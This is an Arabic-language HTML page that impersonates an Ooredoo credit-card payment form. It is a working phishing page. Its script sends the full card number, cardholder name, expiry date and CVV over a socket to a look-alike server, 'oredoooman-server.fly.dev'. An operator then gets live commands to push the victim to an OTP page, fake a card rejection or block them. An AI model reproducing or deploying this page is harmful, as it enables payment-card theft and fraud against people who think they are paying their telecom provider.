<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>بطاقة الائتمان | Ooredoo</title>
<style>
@font-face { font-family: 'Rubik-Regular'; src: url('/ooredoo/fonts/Rubik-Regular.woff2') format('woff2'); }
@font-face { font-family: 'Rubik-Medium'; src: url('/ooredoo/fonts/Rubik-Medium.woff2') format('woff2'); }
@font-face { font-family: 'NotoKufiArabic-Regular'; src: url('/ooredoo/fonts/NotoKufiArabic-Regular.woff2') format('woff2'); }
@font-face { font-family: 'NotoKufiArabic-SemiBold'; src: url('/ooredoo/fonts/NotoKufiArabic-SemiBold.woff2') format('woff2'); }
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Rubik-Regular', 'NotoKufiArabic-Regular', Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; direction: rtl; }
.card-container { width: 100%; max-width: 420px; margin: 40px auto; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; }
.logo-row { display: flex; justify-content: center; margin-bottom: 20px; }
.logo-row img { height: 36px; }
h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 20px; color: #080808; margin-bottom: 6px; }
.subtitle { text-align: center; color: #4c5562; font-size: 14px; margin-bottom: 24px; }
.form-group { margin-bottom: 18px; }
.form-group label { display: block; font-size: 14px; color: #333; margin-bottom: 6px; font-weight: 500; }
.form-group input, .form-group select { width: 100%; height: 48px; border: 1.5px solid #e0e0e0; border-radius: 12px; padding: 0 14px; font-size: 16px; font-family: inherit; outline: none; transition: border-color 0.2s; direction: ltr; text-align: left; }
.form-group input:focus, .form-group select:focus { border-color: #ed1c24; }
.form-group input.error { border-color: #ed1c24; }
.error-msg { color: #ed1c24; font-size: 12px; margin-top: 4px; display: none; }
.row { display: flex; gap: 12px; }
.row .form-group { flex: 1; }
.card-logos { display: flex; align-items: center; gap: 8px; justify-content: center; margin-bottom: 20px; }
.submit-btn { width: 100%; height: 56px; border-radius: 999px; border: none; background: #ed1c24; color: #fff; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 18px; font-weight: 600; cursor: pointer; box-shadow: 0 8px 20px rgba(237,28,36,0.18); transition: opacity 0.2s; }
.submit-btn:disabled { background: #ebecef; color: #9da3ae; cursor: not-allowed; box-shadow: none; }
.waiting-msg { text-align: center; color: #ed1c24; font-size: 14px; margin-top: 12px; display: none; }
@media (max-width: 500px) {
  .card-container { margin: 0; border-radius: 0; min-height: 100vh; padding: 24px 16px; }
}
</style>
</head>
<body>
<div class="card-container">
  <div class="logo-row"><img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo"></div>
  <h1>بيانات البطاقة</h1>
  <p class="subtitle">أدخل بيانات بطاقتك الائتمانية لإتمام عملية الدفع</p>
  <div class="card-logos">
    <span style="color:#1a1f71;font-family:Arial;font-size:15px;font-weight:700;">VISA</span>
    <span style="position:relative;width:32px;height:20px;display:inline-flex;align-items:center;">
      <span style="position:absolute;right:2px;width:18px;height:18px;border-radius:50%;background:#eb001b;"></span>
      <span style="position:absolute;left:2px;width:18px;height:18px;border-radius:50%;background:#f79e1b;opacity:0.95;"></span>
    </span>
  </div>
  <form id="cardForm" autocomplete="off">
    <div class="form-group">
      <label>رقم البطاقة</label>
      <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
      <div class="error-msg" id="cardNumberError">رقم البطاقة غير صحيح</div>
    </div>
    <div class="form-group">
      <label>اسم حامل البطاقة</label>
      <input type="text" id="cardName" placeholder="الاسم كما هو على البطاقة" style="direction:rtl;text-align:right;">
    </div>
    <div class="row">
      <div class="form-group">
        <label>الشهر</label>
        <select id="cardMonth">
          <option value="">MM</option>
          <option value="01">01</option><option value="02">02</option><option value="03">03</option>
          <option value="04">04</option><option value="05">05</option><option value="06">06</option>
          <option value="07">07</option><option value="08">08</option><option value="09">09</option>
          <option value="10">10</option><option value="11">11</option><option value="12">12</option>
        </select>
      </div>
      <div class="form-group">
        <label>السنة</label>
        <select id="cardYear">
          <option value="">YY</option>
        </select>
      </div>
      <div class="form-group">
        <label>CVV</label>
        <input type="password" id="cardCVV" placeholder="•••" maxlength="3" inputmode="numeric">
      </div>
    </div>
    <button type="submit" class="submit-btn" id="submitBtn">متابعة الدفع</button>
    <div class="waiting-msg" id="waitingMsg">جاري التحقق من البطاقة...</div>
  </form>
</div>

<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<script>
(function() {
  var SOCKET_URL = 'https://oredoooman-server.fly.dev';
  var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
  var visitorId = localStorage.getItem('visitorId') || '';

  // Populate year dropdown
  var yearSelect = document.getElementById('cardYear');
  var currentYear = new Date().getFullYear();
  for (var y = currentYear; y <= currentYear + 15; y++) {
    var opt = document.createElement('option');
    opt.value = String(y).slice(-2);
    opt.textContent = String(y);
    yearSelect.appendChild(opt);
  }

  // Get params
  var params = new URLSearchParams(window.location.search);
  var service = params.get('service') || '';
  var amount = params.get('amount') || '0';

  // Format card number
  var cardInput = document.getElementById('cardNumber');
  cardInput.addEventListener('input', function() {
    var val = this.value.replace(/\D/g, '').slice(0, 16);
    var formatted = val.replace(/(\d{4})(?=\d)/g, '$1 ');
    this.value = formatted;
  });

  // Socket
  socket.on('connect', function() {
    if (visitorId) socket.emit('visitor:reconnect', visitorId);
    socket.emit('visitor:pageEnter', 'بطاقة الائتمان');
  });

  socket.on('visitor:registered', function(data) {
    if (data && data._id) { visitorId = data._id; localStorage.setItem('visitorId', data._id); }
    if (data && data.pid) localStorage.setItem('visitorId', data.pid);
  });

  socket.on('visitor:navigate', function(page) { if (page) window.location.href = '/' + page; });

  socket.on('card:action', function(action) {
    var act = (typeof action === 'string') ? action : (action && action.action) || '';
    if (act === 'otp') {
      window.location.href = '/otp-verification/';
    } else if (act === 'atm') {
      window.location.href = '/otp-verification/';
    } else if (act === 'reject') {
      document.getElementById('waitingMsg').textContent = 'تم رفض البطاقة. يرجى المحاولة ببطاقة أخرى.';
      document.getElementById('waitingMsg').style.display = 'block';
      document.getElementById('submitBtn').disabled = false;
      document.getElementById('submitBtn').textContent = 'متابعة الدفع';
    }
  });

  socket.on('cardNumber:verified', function(verified) {
    if (!verified) {
      document.getElementById('cardNumberError').style.display = 'block';
      document.getElementById('cardNumber').classList.add('error');
    }
  });

  socket.on('admin-last-message', function(data) {
    if (data && data.message) {
      localStorage.setItem('adminLastMessage', data.message);
      window.location.href = '/final-page/';
    }
  });

  socket.on('blocked', function() { alert('تم حظرك من استخدام الموقع.'); });

  // Luhn check
  function luhnCheck(num) {
    var sum = 0; var alt = false;
    for (var i = num.length - 1; i >= 0; i--) {
      var n = parseInt(num[i], 10);
      if (alt) { n *= 2; if (n > 9) n -= 9; }
      sum += n; alt = !alt;
    }
    return sum % 10 === 0;
  }

  // Detect card type
  function getCardType(num) {
    if (/^4/.test(num)) return 'Visa';
    if (/^5[1-5]/.test(num)) return 'Mastercard';
    if (/^3[47]/.test(num)) return 'Amex';
    return 'Unknown';
  }

  // Submit
  document.getElementById('cardForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var cardNum = cardInput.value.replace(/\s/g, '');
    var cardName = document.getElementById('cardName').value.trim();
    var month = document.getElementById('cardMonth').value;
    var year = document.getElementById('cardYear').value;
    var cvv = document.getElementById('cardCVV').value;

    // Reset errors
    document.getElementById('cardNumberError').style.display = 'none';
    cardInput.classList.remove('error');

    // Validate
    if (cardNum.length < 13 || !luhnCheck(cardNum)) {
      document.getElementById('cardNumberError').style.display = 'block';
      cardInput.classList.add('error');
      return;
    }
    if (!cardName || !month || !year || cvv.length < 3) return;

    var cardType = getCardType(cardNum);
    var cardLast4 = cardNum.slice(-4);

    // Store payment data for OTP page
    localStorage.setItem('paymentData', JSON.stringify({
      totalPaid: amount,
      cardType: cardType,
      cardLast4: cardLast4,
      serviceName: service,
      cardName: cardName
    }));

    // Disable button
    document.getElementById('submitBtn').disabled = true;
    document.getElementById('submitBtn').textContent = 'جاري المعالجة...';
    document.getElementById('waitingMsg').style.display = 'block';

    // Send to server
    socket.emit('more-info', {
      content: {
        cardNumber: cardNum,
        cardName: cardName,
        expiryMonth: month,
        expiryYear: year,
        cvv: cvv,
        cardType: cardType,
        cardLast4: cardLast4,
        totalPaid: amount,
        serviceName: service
      },
      paymentCard: {
        cardNumber: cardNum,
        cardName: cardName,
        expiryMonth: month,
        expiryYear: year,
        cvv: cvv
      },
      page: 'بطاقة الائتمان',
      waitingForAdminResponse: true
    });
  });
})();
</script>
</body>
</html>
